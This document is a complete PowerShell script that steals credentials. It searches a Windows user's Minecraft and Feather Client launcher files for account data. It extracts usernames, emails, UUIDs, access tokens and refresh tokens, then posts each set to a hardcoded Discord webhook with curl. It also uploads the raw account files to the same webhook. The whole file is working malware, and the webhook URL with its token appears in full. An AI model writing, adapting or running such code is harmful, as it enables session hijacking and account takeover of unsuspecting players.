# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"

# Possible account file locations
$possiblePaths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_profiles.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\FeatherClient\accounts.json",
    "$env:APPDATA\.feather\launcher_accounts.json",
    "$env:USERPROFILE\.feather\accounts.json"
)

$foundAny = $false

foreach ($path in $possiblePaths) {
    if (Test-Path $path) {
        $foundAny = $true
        Write-Host "Found: $path"

        # Read and parse the JSON file
        $json = Get-Content $path -Raw | ConvertFrom-Json

        # Extract session/access tokens from Minecraft launcher_accounts.json
        $accounts = $json.accounts
        if ($accounts) {
            foreach ($key in $accounts.PSObject.Properties.Name) {
                $account = $accounts.$key
                $username = $account.minecraftProfile.name
                $uuid = $account.minecraftProfile.id
                $accessToken = $account.accessToken
                $refreshToken = $account.refreshToken
                $email = $account.username

                $message = "**Account Found!**``````Username: $username`nUUID: $uuid`nEmail: $email`nAccess Token: $accessToken`nRefresh Token: $refreshToken``````"

                $payload = "{`"content`":`"$message`"}"

                & curl.exe -s -X POST $webhookUrl `
                    -H "Content-Type: application/json" `
                    -d $payload

                Write-Host "Sent account: $username"
            }
        }

        # Also send the raw file as backup
        $rawPayload = '{"content":"Raw file attached below:"}'
        & curl.exe -s -X POST $webhookUrl -F "payload_json=$rawPayload" -F "file=@$path"
        Write-Host "Raw file sent."
    }
}

if (-not $foundAny) {
    Write-Host "No account files found. Searched:"
    foreach ($p in $possiblePaths) {
        Write-Host "  - $p"
    }
}

Write-Host ""
Write-Host "Done. Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
